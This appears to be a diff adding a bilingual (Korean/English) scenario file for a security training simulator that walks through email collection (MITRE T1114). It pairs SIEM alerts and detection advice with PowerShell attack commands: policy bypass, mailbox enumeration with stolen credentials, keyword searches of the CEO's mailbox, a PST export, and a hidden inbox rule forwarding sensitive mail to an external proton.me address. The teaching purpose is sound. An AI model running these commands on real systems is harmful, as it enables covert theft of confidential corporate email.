@@ -1,0 +1,146 @@
+{
+  "id": "T1114",
+  "title": "이메일 수집 시뮬레이션",
+  "titleEn": "Email Collection Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "접근", "labelEn": "Access" },
+    { "label": "검색", "labelEn": "Search" },
+    { "label": "수집", "labelEn": "Collect" },
+    { "label": "완료", "labelEn": "Complete" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "type": "attacker" },
+    { "id": "exchange", "label": "Exchange Server", "type": "server" },
+    { "id": "mailbox", "label": "CEO Mailbox", "type": "victim" },
+    { "id": "siem", "label": "SIEM / Audit", "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "exchange", "label": "EWS API", "activeStep": 0 },
+    { "from": "exchange", "to": "mailbox", "label": "Search Query", "activeStep": 1 },
+    { "from": "mailbox", "to": "attacker", "label": "PST Export", "activeStep": 2 },
+    { "from": "siem", "to": "exchange", "label": "Audit Log", "activeStep": 3 }
+  ],
+  "desktopIcons": [
+    { "label": "PowerShell", "icon": "💻" },
+    { "label": "Outlook", "icon": "📧" },
+    { "label": "EWS Client", "icon": "🌐" }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Exchange Web Services 접속 및 메일함 열거\n$cred = New-Object System.Net.NetworkCredential('{userName}@{companyName}.com', 'P@ssw0rd!');\n$ews = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService('Exchange2019');\n$ews.Credentials = $cred;\n$ews.AutodiscoverUrl('{userName}@{companyName}.com');\n\n# 접근 가능한 메일함 목록 확인\n$mailboxes = @('CEO','CFO','HR-Manager','IT-Admin','{userName}');\nforeach($mb in $mailboxes) {\n  try { $ews.GetFolderInfo($mb+'@{companyName}.com', 'Inbox'); Write-Host \\\"[OK] $mb - Inbox accessible\\\" }\n  catch { Write-Host \\\"[DENIED] $mb - No access\\\" }\n}\"",
+      "out": "[OK] CEO - Inbox accessible\n[OK] CFO - Inbox accessible\n[DENIED] HR-Manager - No access\n[OK] IT-Admin - Inbox accessible\n[OK] {userName} - Inbox accessible",
+      "def": "[SIEM] EWS mailbox access enumeration from compromised account",
+      "defAction": "User: {userName}@{companyName}.com\nAction: FolderBind attempts on 5 mailboxes\nSuccessful: CEO, CFO, IT-Admin, {userName}\nDenied: HR-Manager\nSource IP: 10.10.15.22\nRisk: HIGH",
+      "desc": "탈취한 자격증명으로 Exchange EWS에 접속하여 접근 가능한 메일함을 열거합니다.",
+      "descEn": "Connects to Exchange EWS with compromised credentials and enumerates accessible mailboxes.",
+      "stepTitle": "메일함 접근 열거",
+      "stepTitleEn": "Enumerate Mailbox Access",
+      "feynman": "훔친 마스터키로 사무실 문을 하나씩 열어보는 것과 같습니다. CEO, CFO 사무실은 열리지만, HR 사무실은 잠겨 있습니다.",
+      "feynmanEn": "It's like trying a stolen master key on each office door. CEO and CFO offices open, but HR remains locked.",
+      "expert": "Exchange 위임 권한이나 Full Access 권한이 과도하게 부여된 서비스 계정이 공격에 악용됩니다. Exchange 감사 로그에서 FolderBind 이벤트와 다른 사용자 메일함 접근을 모니터링해야 합니다.",
+      "expertEn": "Service accounts with excessive Exchange delegation or Full Access permissions are exploited in attacks. Monitor Exchange audit logs for FolderBind events and cross-mailbox access.",
+      "defTooltip": "다른 사용자의 메일함에 대한 FolderBind 이벤트를 Exchange 감사 로그에서 모니터링하세요. 짧은 시간에 여러 메일함에 접근하면 즉시 조사하세요.",
+      "defTooltipEn": "Monitor FolderBind events on other users' mailboxes in Exchange audit logs. Investigate immediately when multiple mailboxes are accessed in a short time.",
+      "hackerLog": {
+        "title": "메일함 접근 열거",
+        "lines": [
+          { "text": "[OK] CEO, CFO, IT-Admin - Inbox accessible", "desc": "경영진 메일함 접근 권한 확인" },
+          { "text": "[DENIED] HR-Manager", "desc": "HR 메일함은 접근 불가" }
+        ]
+      },
+      "terms": [
+        { "term": "EWS (Exchange Web Services)", "desc": "Exchange Server의 이메일, 일정 등에 프로그래밍 방식으로 접근하는 API" },
+        { "term": "Mailbox Delegation", "desc": "다른 사용자의 메일함에 대한 읽기/쓰기 권한 위임" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# CEO 메일함에서 민감 키워드 검색\n$keywords = @('비밀번호','VPN','인증서','계약서','인수합병','급여','해고');\n$totalResults = 0;\nforeach($kw in $keywords) {\n  $filter = \\\"subject:$kw OR body:$kw\\\";\n  $results = $ews.FindItems('CEO@{companyName}.com', 'Inbox', $filter, 50);\n  Write-Host \\\"[$kw] $($results.TotalCount)건 발견\\\";\n  $totalResults += $results.TotalCount;\n}\nWrite-Host \\\"\\n총 $totalResults건의 민감 이메일 발견\\\"\"",
+      "out": "[비밀번호] 12건 발견\n[VPN] 8건 발견\n[인증서] 5건 발견\n[계약서] 23건 발견\n[인수합병] 7건 발견\n[급여] 15건 발견\n[해고] 3건 발견\n\n총 73건의 민감 이메일 발견",
+      "def": "[SIEM] Keyword search across CEO mailbox via EWS - data reconnaissance",
+      "defAction": "User: {userName}@{companyName}.com\nTarget: CEO@{companyName}.com\nAction: FindItems with 7 sensitive keywords\nResults: 73 emails matched\nKeywords: 비밀번호, VPN, 인증서, 계약서, 인수합병, 급여, 해고\nRisk: CRITICAL",
+      "desc": "CEO 메일함에서 비밀번호, 계약서, 인수합병 등 민감 키워드로 이메일을 대량 검색합니다.",
+      "descEn": "Mass searches CEO mailbox for sensitive keywords like passwords, contracts, mergers and acquisitions.",
+      "stepTitle": "민감 키워드 검색",
+      "stepTitleEn": "Sensitive Keyword Search",
+      "feynman": "CEO 사무실 서류함에서 '기밀', '비밀번호', '계약서'라고 적힌 파일들만 골라내는 것과 같습니다.",
+      "feynmanEn": "It's like going through the CEO's filing cabinet and pulling out only files labeled 'confidential', 'passwords', and 'contracts'.",
+      "expert": "EWS FindItems로 다수의 민감 키워드를 동시에 검색하는 패턴은 공격의 강력한 지표입니다. Microsoft 365 감사 로그에서 SearchQuery 이벤트를 모니터링하고, 특히 다른 사용자 메일함에 대한 검색을 탐지해야 합니다.",
+      "expertEn": "Searching multiple sensitive keywords simultaneously via EWS FindItems is a strong attack indicator. Monitor SearchQuery events in Microsoft 365 audit logs, especially searches on other users' mailboxes.",
+      "defTooltip": "Exchange 감사 로그에서 타인 메일함에 대한 대량 SearchQuery를 탐지하세요. 민감 키워드 패턴을 SIEM 규칙으로 설정하세요.",
+      "defTooltipEn": "Detect bulk SearchQuery on other users' mailboxes in Exchange audit logs. Set up SIEM rules for sensitive keyword patterns.",
+      "hackerLog": {
+        "title": "민감 이메일 검색",
+        "lines": [
+          { "text": "Keywords: 비밀번호, VPN, 인증서, 계약서, 인수합병...", "desc": "7개 민감 키워드로 CEO 메일함 검색" },
+          { "text": "총 73건의 민감 이메일 발견", "desc": "대량의 기밀 이메일 식별 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "FindItems", "desc": "Exchange EWS에서 이메일을 검색하는 API 메서드" },
+        { "term": "Keyword Harvesting", "desc": "특정 키워드로 메일함을 검색하여 민감 정보를 수집하는 기법" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# CEO 메일함 전체를 PST로 내보내기\nNew-MailboxExportRequest -Mailbox CEO@{companyName}.com -FilePath '\\\\{companyName}-fs\\temp$\\ceo_export.pst' -ContentFilter {(Received -ge '2025-01-01')};\n\n# 내보내기 상태 확인\nGet-MailboxExportRequest | Format-List Mailbox, Status, PercentComplete, FilePath\"",
+      "out": "Mailbox         : CEO@{companyName}.com\nStatus          : Completed\nPercentComplete : 100\nFilePath        : \\\\{companyName}-fs\\temp$\\ceo_export.pst\n\nExport Size: 2.3 GB\nEmails Exported: 4,521\nAttachments: 892",
+      "def": "[SIEM] Full mailbox export via New-MailboxExportRequest",
+      "defAction": "User: {userName} (admin rights)\nAction: New-MailboxExportRequest\nTarget: CEO@{companyName}.com\nDestination: \\\\{companyName}-fs\\temp$\\\nSize: 2.3 GB (4,521 emails, 892 attachments)\nRisk: CRITICAL\nAction: Export blocked, account disabled",
+      "desc": "CEO 메일함 전체를 PST 파일로 내보냅니다. 2025년 이후의 이메일 4,521건과 첨부파일 892개가 포함됩니다.",
+      "descEn": "Exports the entire CEO mailbox to a PST file. Includes 4,521 emails and 892 attachments since 2025.",
+      "stepTitle": "메일함 내보내기",
+      "stepTitleEn": "Export Mailbox",
+      "feynman": "CEO의 서류함 전체를 복사기에 넣고 한 번에 복사해서 가져가는 것과 같습니다. 수천 통의 편지와 모든 첨부 문서를 한꺼번에 훔칩니다.",
+      "feynmanEn": "It's like putting the entire CEO filing cabinet through a copier and taking it all at once. Thousands of letters and all attached documents are stolen simultaneously.",
+      "expert": "New-MailboxExportRequest는 Exchange Management Shell의 관리자 명령입니다. 이 명령의 실행을 PowerShell Script Block Logging과 Exchange 감사 로그에서 반드시 탐지해야 합니다. Mailbox Export 역할은 최소 인원에게만 부여하세요.",
+      "expertEn": "New-MailboxExportRequest is an Exchange Management Shell admin command. Detect its execution in PowerShell Script Block Logging and Exchange audit logs. Assign the Mailbox Export role to minimal personnel only.",
+      "defTooltip": "New-MailboxExportRequest 실행을 SIEM에서 실시간 탐지하세요. 이 명령은 정당한 사유 없이 실행되면 안 됩니다.",
+      "defTooltipEn": "Detect New-MailboxExportRequest execution in SIEM in real-time. This command should never run without legitimate justification.",
+      "hackerLog": {
+        "title": "메일함 PST 내보내기",
+        "lines": [
+          { "text": "CEO@{companyName}.com → ceo_export.pst", "desc": "CEO 메일함 전체 내보내기 완료" },
+          { "text": "2.3 GB, 4,521 emails, 892 attachments", "desc": "대량의 기밀 이메일과 첨부파일 유출" }
+        ]
+      },
+      "terms": [
+        { "term": "PST (Personal Storage Table)", "desc": "Outlook 이메일 데이터를 저장하는 파일 형식" },
+        { "term": "MailboxExportRequest", "desc": "Exchange에서 메일함을 PST 파일로 내보내는 관리 명령" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# 메일 전달 규칙 설정 - 지속적 이메일 탈취\n$rule = New-InboxRule -Mailbox CEO@{companyName}.com -Name 'Backup Sync' -SubjectContainsWords @('계약','인수','합병','급여') -ForwardTo 'ext-backup@proton.me' -MarkAsRead -DeleteMessage;\nWrite-Host 'Inbox rule created:';\nGet-InboxRule -Mailbox CEO@{companyName}.com -Identity 'Backup Sync' | Format-List Name, SubjectContainsWords, ForwardTo, DeleteMessage\"",
+      "out": "Inbox rule created:\nName                  : Backup Sync\nSubjectContainsWords  : {계약, 인수, 합병, 급여}\nForwardTo             : ext-backup@proton.me\nDeleteMessage         : True",
+      "def": "[SIEM] Suspicious inbox rule created - auto-forward to external email",
+      "defAction": "User: {userName} (impersonating)\nAction: New-InboxRule on CEO mailbox\nRule: Forward emails with sensitive keywords to ext-backup@proton.me\nAdditional: Auto-delete after forwarding\nRisk: CRITICAL\nAction: Rule removed, incident escalated",
+      "desc": "CEO 메일함에 자동 전달 규칙을 설정하여 계약, 인수합병, 급여 관련 이메일이 자동으로 외부 메일로 전달되도록 합니다.",
+      "descEn": "Sets up an auto-forward rule on the CEO mailbox so that emails about contracts, M&A, and salary are automatically forwarded to an external address.",
+      "stepTitle": "자동 전달 규칙 설정",
+      "stepTitleEn": "Set Forwarding Rule",
+      "feynman": "CEO 비서에게 '계약서나 급여 관련 편지가 오면 복사해서 이 주소로 보내라'고 지시하는 것과 같습니다. CEO는 이 사실을 모르고, 편지는 읽자마자 파기됩니다.",
+      "feynmanEn": "It's like instructing the CEO's secretary: 'Whenever letters about contracts or salaries arrive, copy them and send them to this address.' The CEO doesn't know, and letters are shredded after reading.",
+      "expert": "Inbox Rule을 이용한 지속적 이메일 탈취는 APT 그룹이 자주 사용합니다. DeleteMessage=True로 설정하여 피해자가 전달된 메일을 인지하지 못하게 합니다. M365에서 외부 전달 규칙을 차단하는 Transport Rule을 설정하세요.",
+      "expertEn": "Persistent email theft via Inbox Rules is commonly used by APT groups. DeleteMessage=True prevents victims from noticing forwarded emails. Set Transport Rules in M365 to block external forwarding rules.",
+      "defTooltip": "외부 메일로의 자동 전달 규칙 생성을 차단하세요. M365 보안 센터에서 Inbox Rule 변경을 실시간으로 모니터링하세요.",
+      "defTooltipEn": "Block creation of auto-forwarding rules to external emails. Monitor Inbox Rule changes in real-time through M365 Security Center.",
+      "hackerLog": {
+        "title": "메일 전달 규칙 설정",
+        "lines": [
+          { "text": "Rule: 'Backup Sync' → ext-backup@proton.me", "desc": "민감 키워드 이메일 자동 전달 규칙" },
+          { "text": "DeleteMessage: True", "desc": "전달 후 원본 삭제로 탐지 회피" }
+        ]
+      },
+      "terms": [
+        { "term": "Inbox Rule", "desc": "메일함에 설정하는 자동 처리 규칙 (전달, 삭제, 이동 등)" },
+        { "term": "T1114.003", "desc": "MITRE ATT&CK - 이메일 전달 규칙을 이용한 이메일 수집" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "powershell.exe (EWS)", "depth": 0, "alert": true, "minStep": 0 },
+    { "name": "EWS FolderBind (mailbox enum)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "EWS FindItems (keyword search)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "New-MailboxExportRequest (PST)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "New-InboxRule (auto-forward)", "depth": 1, "alert": true, "minStep": 3 }
+  ]
+}
